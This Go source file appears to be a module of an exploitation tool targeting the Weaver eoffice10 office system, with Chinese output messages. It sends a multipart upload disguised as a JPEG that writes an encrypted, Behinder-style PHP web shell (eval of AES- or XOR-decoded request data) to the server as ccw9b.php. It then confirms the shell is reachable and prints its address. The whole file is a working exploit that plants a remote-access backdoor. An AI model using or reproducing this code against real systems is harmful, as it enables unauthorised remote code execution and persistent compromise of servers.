package main

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
)

func Weaver() {
	fmt.Println("\n-----------------------✂---------------------------")
	fmt.Println("泛微 eoffice10 前台getshell 公开日期：2022/7/28")
	fmt.Println("\n-----------------------✂---------------------------")
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}
	client := &http.Client{Transport: tr}
	req, err := http.NewRequest("POST", url+Eofficepath, strings.NewReader(
		`
------WebKitFormBoundarygfpd61aYDAKQ11RF
Content-Disposition: form-data; name="FileData"; filename="1.jpg"
Content-Type: image/jpeg

true
<?php
@error_reporting(0);
session_start();
    $key="e45e329feb5d925b";
	$_SESSION['k']=$key;
	session_write_close();
	$post=file_get_contents("php://input");
	if(!extension_loaded('openssl'))
	{
		$t="base64_"."decode";
		$post=$t($post."");
		
		for($i=0;$i<strlen($post);$i++) {
    			 $post[$i] = $post[$i]^$key[$i+1&15]; 
    			}
	}
	else
	{
		$post=openssl_decrypt($post, "AES128", $key);
	}
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
	class C{public function __invoke($p) {eval($p."");}}
    @call_user_func(new C(),$params);
?>
------WebKitFormBoundarygfpd61aYDAKQ11RF
Content-Disposition: form-data; name="FormData"

{'USERNAME':'','RECORDID':'undefined','OPTION':'SAVEFILE','FILENAME':'ccw9b.php'}
------WebKitFormBoundarygfpd61aYDAKQ11RF--
`))
	if err != nil {
	}
	req.Header.Add("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundarygfpd61aYDAKQ11RF")
	req.Header.Add("Connection", "close")
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("不存在泛微 eoffice10 前台getshell漏洞")
		return
	}
	defer resp.Body.Close()

	responseGet, err1 := http.Get(url + "/eoffice10/server/public/iWebOffice2015/Document/ccw9b.php")
	if err1 != nil {
		fmt.Println("不存在泛微 eoffice10 前台getshell漏洞")
		return
	}
	defer responseGet.Body.Close()
	s, _ := ioutil.ReadAll(responseGet.Body)
	fmt.Printf("%s", s)
	if string(s) == "true\n" {
		fmt.Println("存在泛微 eoffice10 前台getshell漏洞")
		fmt.Println("冰蝎地址:", url+"/eoffice10/server/public/iWebOffice2015/Document/ccw9b.php")
	} else {
		fmt.Println("不存在泛微 eoffice10 前台getshell漏洞")
	}

}
